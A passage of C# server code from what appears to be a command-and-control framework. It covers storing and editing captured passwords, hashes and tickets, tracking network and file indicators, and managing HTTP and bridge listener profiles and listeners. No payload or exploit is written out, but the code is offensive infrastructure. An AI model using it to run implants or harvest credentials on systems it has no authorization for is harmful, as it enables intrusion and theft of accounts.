            {
                return true;
            }
            foreach (string child in parentGrawl.Children)
            {
                Grawl directChild = await _context.Grawls.FirstOrDefaultAsync(G => G.ANOTHERID == child);
                if (directChild != null && await IsChildGrawl(directChild.Id, ChildId))
                {
                    return true;
                }
            }
            return false;
        }

        private async Task<bool> ContainsCredentials(CapturedCredential cred)
        {
            switch (cred.Type)
            {
                case CredentialType.Password:
                    CapturedPasswordCredential passcred = (CapturedPasswordCredential)cred;
                    return (await _context.Credentials.Where(C => C.Type == CredentialType.Password)
                                   .Select(C => (CapturedPasswordCredential)C)
                                   .FirstOrDefaultAsync(PC =>
                                       PC.Type == passcred.Type &&
                                       PC.Domain == passcred.Domain &&
                                       PC.Username == passcred.Username &&
                                       PC.Password == passcred.Password
                           )) != null;
                case CredentialType.Hash:
                    CapturedHashCredential hashcred = (CapturedHashCredential)cred;
                    return (await _context.Credentials.Where(C => C.Type == CredentialType.Hash)
                                   .Select(C => (CapturedHashCredential)C)
                                   .FirstOrDefaultAsync(PC =>
                                       PC.Type == hashcred.Type &&
                                       PC.Domain == hashcred.Domain &&
                                       PC.Username == hashcred.Username &&
                                       PC.Hash == hashcred.Hash &&
                                       PC.HashCredentialType == hashcred.HashCredentialType
                           )) != null;
                case CredentialType.Ticket:
                    CapturedTicketCredential ticketcred = (CapturedTicketCredential)cred;
                    return (await _context.Credentials.Where(C => C.Type == CredentialType.Ticket)
                                   .Select(C => (CapturedTicketCredential)C)
                                   .FirstOrDefaultAsync(PC =>
                                       PC.Type == ticketcred.Type &&
                                       PC.Domain == ticketcred.Domain &&
                                       PC.Username == ticketcred.Username &&
                                       PC.Ticket == ticketcred.Ticket &&
                                       PC.TicketCredentialType == ticketcred.TicketCredentialType
                           )) != null;
                default:
                    return (await _context.Credentials.FirstOrDefaultAsync(P =>
                                       P.Type == cred.Type &&
                                       P.Domain == cred.Domain &&
                                       P.Username == cred.Username
                           )) != null;
            }
        }
        #endregion

        #region Credentials Actions
        public async Task<IEnumerable<CapturedCredential>> GetCredentials()
        {
            return await _context.Credentials.ToListAsync();
        }

        public async Task<IEnumerable<CapturedPasswordCredential>> GetPasswordCredentials()
        {
            return await _context.Credentials.Where(P => P.Type == CredentialType.Password).Select(P => (CapturedPasswordCredential)P).ToListAsync();
        }

        public async Task<IEnumerable<CapturedHashCredential>> GetHashCredentials()
        {
            return await _context.Credentials.Where(P => P.Type == CredentialType.Hash).Select(H => (CapturedHashCredential)H).ToListAsync();
        }

        public async Task<IEnumerable<CapturedTicketCredential>> GetTicketCredentials()
        {
            return await _context.Credentials.Where(P => P.Type == CredentialType.Ticket).Select(T => (CapturedTicketCredential)T).ToListAsync();
        }

        public async Task<CapturedCredential> GetCredential(int credentialId)
        {
            CapturedCredential credential = await _context.Credentials.FirstOrDefaultAsync(C => C.Id == credentialId);
            if (credential == null)
            {
                throw new ControllerNotFoundException($"NotFound - CapturedCredential with id: {credentialId}");
            }
            return credential;
        }

        public async Task<CapturedPasswordCredential> GetPasswordCredential(int credentialId)
        {
            CapturedPasswordCredential credential = (await this.GetPasswordCredentials()).FirstOrDefault(c => c.Id == credentialId);
            if (credential == null)
            {
                throw new ControllerNotFoundException($"NotFound - CapturedPasswordCredential with id: {credentialId}");
            }
            return credential;
        }

        public async Task<CapturedHashCredential> GetHashCredential(int credentialId)
        {
            CapturedHashCredential credential = (await this.GetHashCredentials()).FirstOrDefault(c => c.Id == credentialId);
            if (credential == null)
            {
                throw new ControllerNotFoundException($"NotFound - CapturedHashCredential with id: {credentialId}");
            }
            return credential;
        }

        public async Task<CapturedTicketCredential> GetTicketCredential(int credentialId)
        {
            CapturedTicketCredential credential = (await this.GetTicketCredentials()).FirstOrDefault(c => c.Id == credentialId);
            if (credential == null)
            {
                throw new ControllerNotFoundException($"NotFound - CapturedTicketCredential with id: {credentialId}");
            }
            return credential;
        }

        public async Task<CapturedPasswordCredential> CreatePasswordCredential(CapturedPasswordCredential credential)
        {
            await _context.Credentials.AddAsync(credential);
            await _context.SaveChangesAsync();
            // _notifier.OnCreateCapturedCredential(this, credential);
            return await GetPasswordCredential(credential.Id);
        }

        public async Task<CapturedHashCredential> CreateHashCredential(CapturedHashCredential credential)
        {
            await _context.Credentials.AddAsync(credential);
            await _context.SaveChangesAsync();
            // _notifier.OnCreateCapturedCredential(this, credential);
            return await GetHashCredential(credential.Id);
        }

        public async Task<CapturedTicketCredential> CreateTicketCredential(CapturedTicketCredential credential)
        {
            await _context.Credentials.AddAsync(credential);
            await _context.SaveChangesAsync();
            // _notifier.OnCreateCapturedCredential(this, credential);
            return await GetTicketCredential(credential.Id);
        }

        public async Task<IEnumerable<CapturedCredential>> CreateCredentials(params CapturedCredential[] credentials)
        {
            await _context.Credentials.AddRangeAsync(credentials);
            await _context.SaveChangesAsync();
            return credentials;
        }

        public async Task<CapturedPasswordCredential> EditPasswordCredential(CapturedPasswordCredential credential)
        {
            CapturedPasswordCredential matchingCredential = await this.GetPasswordCredential(credential.Id);
            matchingCredential.Username = credential.Username;
            matchingCredential.Password = credential.Password;
            matchingCredential.Type = credential.Type;

            _context.Credentials.Update(matchingCredential);
            await _context.SaveChangesAsync();
            // _notifier.OnEditCapturedCredential(this, matchingCredential);
            return await GetPasswordCredential(matchingCredential.Id);
        }

        public async Task<CapturedHashCredential> EditHashCredential(CapturedHashCredential credential)
        {
            CapturedHashCredential matchingCredential = await this.GetHashCredential(credential.Id);
            matchingCredential.Username = credential.Username;
            matchingCredential.Hash = credential.Hash;
            matchingCredential.HashCredentialType = credential.HashCredentialType;
            matchingCredential.Type = credential.Type;

            _context.Credentials.Update(matchingCredential);
            await _context.SaveChangesAsync();
            // _notifier.OnEditCapturedCredential(this, matchingCredential);
            return await GetHashCredential(matchingCredential.Id);
        }

        public async Task<CapturedTicketCredential> EditTicketCredential(CapturedTicketCredential credential)
        {
            CapturedTicketCredential matchingCredential = await this.GetTicketCredential(credential.Id);
            matchingCredential.Username = credential.Username;
            matchingCredential.Ticket = credential.Ticket;
            matchingCredential.TicketCredentialType = credential.TicketCredentialType;
            matchingCredential.Type = credential.Type;

            _context.Credentials.Update(matchingCredential);
            await _context.SaveChangesAsync();
            // _notifier.OnEditCapturedCredential(this, matchingCredential);
            return await GetTicketCredential(matchingCredential.Id);
        }

        public async Task DeleteCredential(int credentialId)
        {
            CapturedCredential credential = await this.GetCredential(credentialId);
            if (credential == null)
            {
                throw new ControllerNotFoundException($"NotFound - CapturedCredential with id: {credentialId}");
            }
            _context.Credentials.Remove(credential);
            await _context.SaveChangesAsync();
            // _notifier.OnDeleteCapturedCredential(this, credential.Id);
        }
        #endregion

        #region Indicator Actions
        public async Task<IEnumerable<Indicator>> GetIndicators()
        {
            return await _context.Indicators.ToListAsync();
        }

        public async Task<IEnumerable<FileIndicator>> GetFileIndicators()
        {
            return await _context.Indicators.Where(I => I.Type == IndicatorType.FileIndicator)
                .Select(I => (FileIndicator)I).ToListAsync();
        }

        public async Task<IEnumerable<NetworkIndicator>> GetNetworkIndicators()
        {
            return await _context.Indicators.Where(I => I.Type == IndicatorType.NetworkIndicator)
                .Select(I => (NetworkIndicator)I).ToListAsync();
        }

        public async Task<IEnumerable<TargetIndicator>> GetTargetIndicators()
        {
            return await _context.Indicators.Where(I => I.Type == IndicatorType.TargetIndicator)
                .Select(I => (TargetIndicator)I).ToListAsync();
        }

        public async Task<Indicator> GetIndicator(int indicatorId)
        {
            Indicator indicator = await _context.Indicators.FirstOrDefaultAsync(I => I.Id == indicatorId);
            if (indicator == null)
            {
                throw new ControllerNotFoundException($"NotFound - Indicator with id: {indicatorId}");
            }
            return indicator;
        }

        public async Task<FileIndicator> GetFileIndicator(int indicatorId)
        {
            Indicator indicator = await _context.Indicators.FirstOrDefaultAsync(I => I.Id == indicatorId);
            if (indicator == null || indicator.Type != IndicatorType.FileIndicator)
            {
                throw new ControllerNotFoundException($"NotFound - FileIndicator with id: {indicatorId}");
            }
            return (FileIndicator)indicator;
        }

        public async Task<NetworkIndicator> GetNetworkIndicator(int indicatorId)
        {
            Indicator indicator = await _context.Indicators.FirstOrDefaultAsync(I => I.Id == indicatorId);
            if (indicator == null || indicator.Type != IndicatorType.NetworkIndicator)
            {
                throw new ControllerNotFoundException($"NotFound - NetworkIndicator with id: {indicatorId}");
            }
            return (NetworkIndicator)indicator;
        }

        public async Task<TargetIndicator> GetTargetIndicator(int indicatorId)
        {
            Indicator indicator = await _context.Indicators.FirstOrDefaultAsync(I => I.Id == indicatorId);
            if (indicator == null || indicator.Type != IndicatorType.TargetIndicator)
            {
                throw new ControllerNotFoundException($"NotFound - TargetIndicator with id: {indicatorId}");
            }
            return (TargetIndicator)indicator;
        }

        public async Task<Indicator> CreateIndicator(Indicator indicator)
        {
            await _context.Indicators.AddAsync(indicator);
            await _context.SaveChangesAsync();
            // _notifier.OnCreateIndicator(this, indicator);
            return await GetIndicator(indicator.Id);
        }

        public async Task<IEnumerable<Indicator>> CreateIndicators(params Indicator[] indicators)
        {
            await _context.Indicators.AddRangeAsync(indicators);
            await _context.SaveChangesAsync();
            return indicators;
        }

        public async Task<Indicator> EditIndicator(Indicator indicator)
        {
            Indicator matchingIndicator = await this.GetIndicator(indicator.Id);
            if (matchingIndicator == null)
            {
                throw new ControllerNotFoundException($"NotFound - Indicator with id: {indicator.Id}");
            }
            matchingIndicator.Type = indicator.Type;
            switch (indicator.Type)
            {
                case IndicatorType.FileIndicator:
                    FileIndicator matchingFileIndicator = (FileIndicator)matchingIndicator;
                    FileIndicator fileIndicator = (FileIndicator)indicator;
                    matchingFileIndicator.FileName = fileIndicator.FileName;
                    matchingFileIndicator.FilePath = fileIndicator.FilePath;
                    matchingFileIndicator.SHA2 = fileIndicator.SHA2;
                    matchingFileIndicator.SHA1 = fileIndicator.SHA1;
                    matchingFileIndicator.MD5 = fileIndicator.MD5;
                    _context.Indicators.Update(matchingFileIndicator);
                    break;
                case IndicatorType.NetworkIndicator:
                    NetworkIndicator matchingNetworkIndicator = (NetworkIndicator)matchingIndicator;
                    NetworkIndicator networkIndicator = (NetworkIndicator)indicator;
                    matchingNetworkIndicator.Protocol = networkIndicator.Protocol;
                    matchingNetworkIndicator.Domain = networkIndicator.Domain;
                    matchingNetworkIndicator.IPAddress = networkIndicator.IPAddress;
                    matchingNetworkIndicator.Port = networkIndicator.Port;
                    matchingNetworkIndicator.URI = networkIndicator.URI;
                    _context.Indicators.Update(matchingNetworkIndicator);
                    break;
                case IndicatorType.TargetIndicator:
                    TargetIndicator matchingTargetIndicator = (TargetIndicator)matchingIndicator;
                    TargetIndicator targetIndicator = (TargetIndicator)indicator;
                    matchingTargetIndicator.ComputerName = targetIndicator.ComputerName;
                    matchingTargetIndicator.UserName = targetIndicator.UserName;
                    _context.Indicators.Update(matchingTargetIndicator);
                    break;
            }
            await _context.SaveChangesAsync();
            // _notifier.OnEditIndicator(this, indicator);
            return await this.GetIndicator(indicator.Id);
        }

        public async Task DeleteIndicator(int indicatorId)
        {
            Indicator indicator = await this.GetIndicator(indicatorId);
            if (indicator == null)
            {
                throw new ControllerNotFoundException($"NotFound - Indicator with id: {indicatorId}");
            }
            _context.Indicators.Remove(indicator);
            await _context.SaveChangesAsync();
            // _notifier.OnDeleteIndicator(this, indicator.Id);
        }
        #endregion

        #region ListenerType Actions
        public async Task<IEnumerable<ListenerType>> GetListenerTypes()
        {
            return await _context.ListenerTypes.ToListAsync();
        }

        public async Task<ListenerType> GetListenerType(int listenerTypeId)
        {
            ListenerType type = await _context.ListenerTypes.FirstOrDefaultAsync(L => L.Id == listenerTypeId);
            if (type == null)
            {
                throw new ControllerNotFoundException($"NotFound - ListenerType with id: {listenerTypeId}");
            }
            return type;
        }

        public async Task<ListenerType> GetListenerTypeByName(string name)
        {
            ListenerType type = await _context.ListenerTypes.FirstOrDefaultAsync(LT => LT.Name == name);
            if (type == null)
            {
                throw new ControllerNotFoundException($"NotFound - ListenerType with name: {name}");
            }
            return type;
        }
        #endregion

        #region Profile Actions
        public async Task<IEnumerable<Profile>> GetProfiles()
        {
            return await _context.Profiles.ToListAsync();
        }

        public async Task<Profile> GetProfile(int profileId)
        {
            Profile profile = await _context.Profiles.FirstOrDefaultAsync(P => P.Id == profileId);
            if (profile == null)
            {
                throw new ControllerNotFoundException($"NotFound - Profile with id: {profileId}");
            }
            return profile;
        }

        public async Task<Profile> CreateProfile(Profile profile, RedWolfUser currentUser)
        {
            if (!await this.IsAdmin(currentUser))
            {
                throw new ControllerUnauthorizedException($"Unauthorized - User with username: {currentUser.UserName} is not an Administrator and cannot create new profiles");
            }
            await _context.Profiles.AddAsync(profile);
            await _context.SaveChangesAsync();
            // _notifier.OnCreateProfile(this, profile);
            return await this.GetProfile(profile.Id);
        }

        public async Task<IEnumerable<Profile>> CreateProfiles(params Profile[] profiles)
        {
            await _context.Profiles.AddRangeAsync(profiles);
            await _context.SaveChangesAsync();
            return profiles;
        }

        public async Task<Profile> EditProfile(Profile profile, RedWolfUser currentUser)
        {
            Profile matchingProfile = await this.GetProfile(profile.Id);
            matchingProfile.Description = profile.Description;
            matchingProfile.Name = profile.Name;
            matchingProfile.Type = profile.Type;
            _context.Profiles.Update(matchingProfile);
            await _context.SaveChangesAsync();
            // _notifier.OnEditProfile(this, matchingProfile);
            return await this.GetProfile(profile.Id);
        }

        public async Task DeleteProfile(int id)
        {
            Profile profile = await this.GetProfile(id);
            _context.Profiles.Remove(profile);
            await _context.SaveChangesAsync();
            // _notifier.OnDeleteProfile(this, profile.Id);
        }

        public async Task<IEnumerable<HttpProfile>> GetHttpProfiles()
        {
            return await _context.Profiles.Where(P => P.Type == ProfileType.HTTP).Select(P => (HttpProfile)P).ToListAsync();
        }

        public async Task<IEnumerable<BridgeProfile>> GetBridgeProfiles()
        {
            return await _context.Profiles.Where(P => P.Type == ProfileType.Bridge).Select(P => (BridgeProfile)P).ToListAsync();
        }

        public async Task<HttpProfile> GetHttpProfile(int profileId)
        {
            Profile profile = await _context.Profiles.FirstOrDefaultAsync(P => P.Id == profileId);
            if (profile == null || profile.Type != ProfileType.HTTP)
            {
                throw new ControllerNotFoundException($"NotFound - HttpProfile with id: {profileId}");
            }
            return (HttpProfile)profile;
        }

        public async Task<BridgeProfile> GetBridgeProfile(int profileId)
        {
            Profile profile = await _context.Profiles.FirstOrDefaultAsync(P => P.Id == profileId);
            if (profile == null || profile.Type != ProfileType.Bridge)
            {
                throw new ControllerNotFoundException($"NotFound - BridgeProfile with id: {profileId}");
            }
            return (BridgeProfile)profile;
        }

        public async Task<HttpProfile> CreateHttpProfile(HttpProfile profile, RedWolfUser currentUser)
        {
            if (!await this.IsAdmin(currentUser))
            {
                throw new ControllerUnauthorizedException($"Unauthorized - User with username: {currentUser.UserName} is not an Administrator and cannot create new profiles");
            }
            await _context.Profiles.AddAsync(profile);
            await _context.SaveChangesAsync();
            // _notifier.OnCreateProfile(this, profile);
            return await this.GetHttpProfile(profile.Id);
        }

        public async Task<BridgeProfile> CreateBridgeProfile(BridgeProfile profile, RedWolfUser currentUser)
        {
            if (!await this.IsAdmin(currentUser))
            {
                throw new ControllerUnauthorizedException($"Unauthorized - User with username: {currentUser.UserName} is not an Administrator and cannot create new profiles");
            }
            await _context.Profiles.AddAsync(profile);
            await _context.SaveChangesAsync();
            // _notifier.OnCreateProfile(this, profile);
            return await this.GetBridgeProfile(profile.Id);
        }

        public async Task<HttpProfile> EditHttpProfile(HttpProfile profile, RedWolfUser currentUser)
        {
            HttpProfile matchingProfile = await this.GetHttpProfile(profile.Id);
            Listener l = await _context.Listeners.FirstOrDefaultAsync(L => L.ProfileId == matchingProfile.Id && L.Status == ListenerStatus.Active);
            if (l != null)
            {
                throw new ControllerBadRequestException($"BadRequest - Cannot edit a profile assigned to an Active Listener");
            }
            matchingProfile.Name = profile.Name;
            matchingProfile.Type = profile.Type;
            matchingProfile.Description = profile.Description;
            matchingProfile.HttpRequestHeaders = profile.HttpRequestHeaders;
            matchingProfile.HttpResponseHeaders = profile.HttpResponseHeaders;
            matchingProfile.HttpUrls = profile.HttpUrls;
            matchingProfile.HttpGetResponse = profile.HttpGetResponse.Replace("\r\n", "\n");
            matchingProfile.HttpPostRequest = profile.HttpPostRequest.Replace("\r\n", "\n");
            matchingProfile.HttpPostResponse = profile.HttpPostResponse.Replace("\r\n", "\n");
            if (matchingProfile.MessageTransform != profile.MessageTransform)
            {
                if (!await this.IsAdmin(currentUser))
                {
                    throw new ControllerUnauthorizedException($"Unauthorized - User with username: {currentUser.UserName} is not an Administrator and cannot create new profiles");
                }
                matchingProfile.MessageTransform = profile.MessageTransform;
            }
            _context.Update(matchingProfile);
            await _context.SaveChangesAsync();
            // _notifier.OnEditProfile(this, matchingProfile);
            return await this.GetHttpProfile(profile.Id);
        }

        public async Task<BridgeProfile> EditBridgeProfile(BridgeProfile profile, RedWolfUser currentUser)
        {
            BridgeProfile matchingProfile = await this.GetBridgeProfile(profile.Id);
            Listener l = await _context.Listeners.FirstOrDefaultAsync(L => L.ProfileId == matchingProfile.Id && L.Status == ListenerStatus.Active);
            if (l != null)
            {
                throw new ControllerBadRequestException($"BadRequest - Cannot edit a profile assigned to an Active Listener");
            }
            matchingProfile.Name = profile.Name;
            matchingProfile.Type = profile.Type;
            matchingProfile.Description = profile.Description;
            matchingProfile.ReadFormat = profile.ReadFormat;
            matchingProfile.WriteFormat = profile.WriteFormat;
            matchingProfile.BridgeMessengerCode = profile.BridgeMessengerCode;
            if (matchingProfile.MessageTransform != profile.MessageTransform)
            {
                if (!await this.IsAdmin(currentUser))
                {
                    throw new ControllerUnauthorizedException($"Unauthorized - User with username: {currentUser.UserName} is not an Administrator and cannot create new profiles");
                }
                matchingProfile.MessageTransform = profile.MessageTransform;
            }
            _context.Update(matchingProfile);
            await _context.SaveChangesAsync();
            // _notifier.OnEditProfile(this, matchingProfile);
            return await this.GetBridgeProfile(profile.Id);
        }
        #endregion

        #region Listener Actions
        public async Task<IEnumerable<Listener>> GetListeners()
        {
            return await _context.Listeners
                .Include(L => L.ListenerType)
                .Include(L => L.Profile)
                .ToListAsync();
        }

        public async Task<Listener> GetListener(int listenerId)
        {
            Listener listener = await _context.Listeners
                .Include(L => L.ListenerType)
                .Include(L => L.Profile)
                .FirstOrDefaultAsync(L => L.Id == listenerId);
            if (listener == null)
            {
                throw new ControllerNotFoundException($"NotFound - Listener with id: {listenerId}");
            }
            return listener;
        }

        public async Task<Listener> EditListener(Listener listener)
        {
            Listener matchingListener = await this.GetListener(listener.Id);
            matchingListener.Name = listener.Name;
            matchingListener.ANOTHERID = listener.ANOTHERID;
            matchingListener.Description = listener.Description;
            matchingListener.BindAddress = listener.BindAddress;
            matchingListener.BindPort = listener.BindPort;
            matchingListener.ConnectAddresses = listener.ConnectAddresses;
            matchingListener.RedWolfUrl = listener.RedWolfUrl;
            matchingListener.RedWolfToken = listener.RedWolfToken;

            if (matchingListener.Status == ListenerStatus.Active && listener.Status == ListenerStatus.Stopped)
            {
                matchingListener.Stop(_cancellationTokens[matchingListener.Id]);
                matchingListener.Status = listener.Status;
                matchingListener.StartTime = DateTime.MinValue;
                Event listenerEvent = await this.CreateEvent(new Event
                {
                    Time = DateTime.UtcNow,
                    MessageHeader = "Stopped Listener",
                    MessageBody = "Stopped Listener: " + matchingListener.Name,
                    Level = EventLevel.Warning,
                    Context = "*"
                });
                await _context.SaveChangesAsync();
            }
            else if (matchingListener.Status != ListenerStatus.Active && listener.Status == ListenerStatus.Active)
            {
                matchingListener.StartTime = DateTime.UtcNow;
                Profile profile = await this.GetProfile(matchingListener.ProfileId);
                CancellationTokenSource listenerCancellationToken = null;
                try
                {
                    listenerCancellationToken = matchingListener.Start();
                    matchingListener.Status = ListenerStatus.Active;
                }
                catch (ListenerStartException e)
                {
                    throw new ControllerBadRequestException($"BadRequest - Listener with id: {matchingListener.Id} did not start due to exception: {e.Message}");
                }
                _cancellationTokens[matchingListener.Id] = listenerCancellationToken ?? throw new ControllerBadRequestException($"BadRequest - Listener with id: {matchingListener.Id} did not start properly");
                Event listenerEvent = await this.CreateEvent(new Event
                {
                    Time = matchingListener.StartTime,
                    MessageHeader = "Started Listener",
                    MessageBody = "Started Listener: " + matchingListener.Name,
                    Level = EventLevel.Highlight,
                    Context = "*"
                });
                await _context.SaveChangesAsync();
            }
            _context.Listeners.Update(matchingListener);
            await _context.SaveChangesAsync();
            await _notifier.NotifyEditListener(this, matchingListener);
            return await this.GetListener(matchingListener.Id);
        }

        public async Task StartListener(int listenerId)
        {
            Listener listener = await this.GetListener(listenerId);
            Profile profile = await this.GetProfile(listener.ProfileId);
            try
            {
                CancellationTokenSource listenerCancellationToken = listener.Start();
                _context.Listeners.Update(listener);
                await _context.SaveChangesAsync();
                await _notifier.NotifyEditListener(this, listener);
                _cancellationTokens[listener.Id] = listenerCancellationToken ?? throw new ControllerBadRequestException($"BadRequest - Listener with id: {listener.Id} did not start properly");
            }
            catch (ListenerStartException e)
            {
                throw new ControllerBadRequestException($"BadRequest - Listener with id: {listener.Id} did not start due to exception: {e.Message}");
            }
        }

        public async Task DeleteListener(int listenerId)
        {
            Listener listener = await this.GetListener(listenerId);
            if (listener.Status == ListenerStatus.Active)
            {
                listener.Stop(_cancellationTokens[listener.Id]);
            }
            _context.Launchers.Where(L => L.ListenerId == listener.Id).ToList().ForEach(L =>
            {
                L.LauncherString = "";
                L.StagerCode = "";
                L.Base64ILByteString = "";
                _context.Launchers.Update(L);
            });
            _context.Listeners.Remove(listener);
            await _context.SaveChangesAsync();
            // _notifier.OnDeleteListener(this, listener.Id);
        }

        public async Task<IEnumerable<HttpListener>> GetHttpListeners()
        {
            return await _context.Listeners
                .Include(L => L.ListenerType)
                .Include(L => L.Profile)
                .Where(L => L.ListenerType.Name == "HTTP")
                .Select(L => (HttpListener)L)
                .ToListAsync();
        }

        public async Task<IEnumerable<BridgeListener>> GetBridgeListeners()
        {
            return await _context.Listeners
                .Include(L => L.ListenerType)
                .Include(L => L.Profile)
                .Where(L => L.ListenerType.Name == "Bridge")
                .Select(L => (BridgeListener)L)
                .ToListAsync();
        }

        public async Task<HttpListener> GetHttpListener(int listenerId)
        {
            Listener listener = await this.GetListener(listenerId);
            ListenerType listenerType = await this.GetListenerType(listener.ListenerTypeId);
            if (listenerType.Name != "HTTP")
            {
                throw new ControllerNotFoundException($"NotFound - HttpListener with id: {listener.ListenerTypeId}");
            }
            return (HttpListener)listener;
        }

        public async Task<BridgeListener> GetBridgeListener(int listenerId)
        {
            Listener listener = await this.GetListener(listenerId);
            ListenerType listenerType = await this.GetListenerType(listener.ListenerTypeId);
            if (listenerType.Name != "Bridge")
            {
                throw new ControllerNotFoundException($"NotFound - BridgeListener with id: {listener.ListenerTypeId}");
            }
            return (BridgeListener)listener;
        }

        private async Task<HttpListener> StartInitialHttpListener(HttpListener listener)
        {
            listener.StartTime = DateTime.UtcNow;
            if (listener.UseSSL && string.IsNullOrWhiteSpace(listener.SSLCertificate))
            {
                throw new ControllerBadRequestException($"HttpListener: {listener.Name} missing SSLCertificate");
            }
            if (_context.Listeners.Where(L => L.Status == ListenerStatus.Active && L.BindPort == listener.BindPort).Any())
            {
                throw new ControllerBadRequestException($"Listener already listening on port: {listener.BindPort}");
            }
            await this.StartListener(listener.Id);

            for (int i = 0; i < listener.ConnectAddresses.Count; i++)
            {
                NetworkIndicator httpIndicator = new NetworkIndicator
                {
                    Protocol = "http",
                    Domain = Utilities.IsIPAddress(listener.ConnectAddresses[i]) ? "" : listener.ConnectAddresses[i],
                    IPAddress = Utilities.IsIPAddress(listener.ConnectAddresses[i]) ? listener.ConnectAddresses[i] : "",
                    Port = listener.BindPort,
                    URI = listener.Urls[i]
                };
                IEnumerable<NetworkIndicator> indicators = await this.GetNetworkIndicators();
                if (indicators.FirstOrDefault(I => I.IPAddress == httpIndicator.IPAddress && I.Domain == httpIndicator.Domain) == null)
                {
                    await _context.Indicators.AddAsync(httpIndicator);
                    // _notifier.OnCreateIndicator(this, httpIndicator);
                }
            }

            Event listenerEvent = await this.CreateEvent(new Event
            {
                Time = listener.StartTime,
                MessageHeader = "Started Listener",
                MessageBody = "Started Listener: " + listener.Name,
                Level = EventLevel.Highlight,
                Context = "*"
            });
            await _context.SaveChangesAsync();
            return listener;
        }

        private async Task<BridgeListener> StartInitialBridgeListener(BridgeListener listener)
        {
            listener.StartTime = DateTime.UtcNow;
            if (_context.Listeners.Where(L => L.Status == ListenerStatus.Active && L.BindPort == listener.BindPort).Any())
            {
                throw new ControllerBadRequestException($"Listener already listening on port: {listener.BindPort}");
            }
            CancellationTokenSource listenerCancellationToken = null;
            try
            {
                listenerCancellationToken = listener.Start();
            }
            catch (ListenerStartException e)
            {
                throw new ControllerBadRequestException($"BadRequest - Listener with id: {listener.Id} did not start due to exception: {e.Message}");
            }
            _cancellationTokens[listener.Id] = listenerCancellationToken ?? throw new ControllerBadRequestException($"BadRequest - Listener with id: {listener.Id} did not start properly");

            for (int i = 0; i < listener.ConnectAddresses.Count; i++)
            {
                NetworkIndicator bridgeIndicator = new NetworkIndicator
                {
                    Protocol = "bridge",
                    Domain = Utilities.IsIPAddress(listener.ConnectAddresses[i]) ? "" : listener.ConnectAddresses[i],
                    IPAddress = Utilities.IsIPAddress(listener.ConnectAddresses[i]) ? listener.ConnectAddresses[i] : "",
                    Port = listener.BindPort
                };
                IEnumerable<NetworkIndicator> indicators = await this.GetNetworkIndicators();
                if (indicators.FirstOrDefault(I => I.IPAddress == bridgeIndicator.IPAddress && I.Domain == bridgeIndicator.Domain) == null)
                {
                    await _context.Indicators.AddAsync(bridgeIndicator);
                    // _notifier.OnCreateIndicator(this, bridgeIndicator);
                }
            }

            _cancellationTokens[listener.Id] = listenerCancellationToken;
            Event listenerEvent = await this.CreateEvent(new Event
            {
                Time = listener.StartTime,
                MessageHeader = "Started Listener",
                MessageBody = "Started Listener: " + listener.Name,
                Level = EventLevel.Highlight,
                Context = "*"
            });
            await _context.SaveChangesAsync();
            return listener;
        }

        public async Task<HttpListener> CreateHttpListener(HttpListener listener)
        {
            listener.ListenerType = await this.GetListenerType(listener.ListenerTypeId);
            listener.Profile = await this.GetHttpProfile(listener.ProfileId);
            // Append capital letter to appease Password complexity requirements, get rid of warning output
            string password = Utilities.CreateSecureGuid().ToString() + "A";
            RedWolfUser listenerUser = await this.CreateUser(new RedWolfUserLogin
            {
                UserName = Utilities.CreateSecureGuid().ToString(),
                Password = password
            });
            IdentityRole listenerRole = await this.GetRoleByName("Listener");
            IdentityUserRole<string> userrole = await this.CreateUserRole(listenerUser.Id, listenerRole.Id);
            listener.RedWolfUrl = "https://localhost:" + _configuration["RedWolfPort"];
            listener.RedWolfToken = Utilities.GenerateJwtToken(
                listenerUser.UserName, listenerUser.Id, new[] { listenerRole.Name },
                _configuration["JwtKey"], _configuration["JwtIssuer"],
                _configuration["JwtAudience"], "2000"
            );
            if (listener.Status == ListenerStatus.Active)
            {
                listener.Status = ListenerStatus.Uninitialized;
                await _context.Listeners.AddAsync(listener);
                await _context.SaveChangesAsync();
                await _notifier.NotifyCreateListener(this, listener);
                listener = await this.StartInitialHttpListener(listener);
                _context.Listeners.Update(listener);
                await _context.SaveChangesAsync();
                await _notifier.NotifyEditListener(this, listener);
            }
            else
            {
                await _context.Listeners.AddAsync(listener);
                await _context.SaveChangesAsync();
                await _notifier.NotifyCreateListener(this, listener);
            }
            return await this.GetHttpListener(listener.Id);
        }

        public async Task<BridgeListener> CreateBridgeListener(BridgeListener listener)
        {
            listener.Profile = await this.GetBridgeProfile(listener.ProfileId);
            // Append capital letter to appease Password complexity requirements, get rid of warning output
            string password = Utilities.CreateSecureGuid().ToString() + "A";
            RedWolfUser listenerUser = await this.CreateUser(new RedWolfUserLogin
            {
                UserName = Utilities.CreateSecureGuid().ToString(),
                Password = password
            });
            IdentityRole listenerRole = await _context.Roles.FirstOrDefaultAsync(R => R.Name == "Listener");
            IdentityUserRole<string> userrole = await this.CreateUserRole(listenerUser.Id, listenerRole.Id);
            listener.RedWolfUrl = "https://localhost:" + _configuration["RedWolfPort"];
            listener.RedWolfToken = Utilities.GenerateJwtToken(
                listenerUser.UserName, listenerUser.Id, new[] { listenerRole.Name },
                _configuration["JwtKey"], _configuration["JwtIssuer"],
                _configuration["JwtAudience"], "2000"
            );
            if (listener.Status == ListenerStatus.Active)
            {
                listener.Status = ListenerStatus.Uninitialized;
                await _context.Listeners.AddAsync(listener);
                await _context.SaveChangesAsync();
                await _notifier.NotifyCreateListener(this, listener);
                listener.Status = ListenerStatus.Active;
                listener = await this.StartInitialBridgeListener(listener);
                _context.Listeners.Update(listener);
                await _context.SaveChangesAsync();
                await _notifier.NotifyEditListener(this, listener);
            }
            else
            {
                await _context.Listeners.AddAsync(listener);
                await _context.SaveChangesAsync();
                await _notifier.NotifyCreateListener(this, listener);
            }
            return await this.GetBridgeListener(listener.Id);
        }

        public async Task<IEnumerable<Listener>> CreateListeners(params Listener[] listeners)
        {
            await _context.Listeners.AddRangeAsync(listeners);
            await _context.SaveChangesAsync();
            foreach (Listener l in listeners)
            {
                await _notifier.NotifyCreateListener(this, l);
            }
            return listeners;
        }

        public async Task<HttpListener> EditHttpListener(HttpListener listener)
        {
            HttpListener matchingListener = await this.GetHttpListener(listener.Id);
            matchingListener.Name = listener.Name;
            matchingListener.ANOTHERID = listener.ANOTHERID;
            matchingListener.BindAddress = listener.BindAddress;
            matchingListener.BindPort = listener.BindPort;
            matchingListener.ConnectAddresses = listener.ConnectAddresses;
            matchingListener.ConnectPort = listener.ConnectPort;
            matchingListener.UseSSL = listener.UseSSL;
            matchingListener.SSLCertificatePassword = listener.SSLCertificatePassword;
            matchingListener.SSLCertificate = listener.SSLCertificate;

